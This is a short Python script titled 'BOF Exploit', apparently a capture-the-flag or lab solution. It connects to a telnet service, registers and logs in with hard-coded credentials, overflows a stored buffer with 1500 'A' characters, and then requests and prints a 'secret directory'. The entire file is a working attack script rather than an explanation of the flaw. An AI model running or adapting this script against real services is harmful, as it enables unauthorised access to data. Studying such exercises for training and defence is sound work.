import telnetlib
import argparse

parser = argparse.ArgumentParser(description="BOF Exploit")
parser.add_argument("host", help="The host IP address")
parser.add_argument("port", help="The host port")
args = parser.parse_args()

"""
read & write
"""
def read(end_text):
    tn.read_until(end_text.encode())

def write(text):
    tn.write(("{0}\n".format(text)).encode())

#connect 
tn = telnetlib.Telnet(args.host, args.port)
#register/login
for i in range(1,3):
    read("4") #listen f-r the end of thw welcome message
    write(str(i)) #pick an option(1 the first time, 2 the second)
    read(":") #waitt for the end of the username prompt
    write("lemaitre6969") #enter username
    read(":") #wait for the end of the PW prompt
    write("qweqwe") #enter PW

#store buffer
read("4") #listen for the end of the welcome message
write("4") #pick option 4 to store the buffer
read(":") #lister for the end of the buffer prompt
write("A"*1500) #calculate and store the buffer

read("4") #listen for the end of the welcome message
write("3") #pick option 3 to receive our secret directory
read("\n") #work around to get rid of the newline preceeding response
print(tn.read_until("\n".encode()).decode()) #output the directory

#in new version of interp telnet isn't working
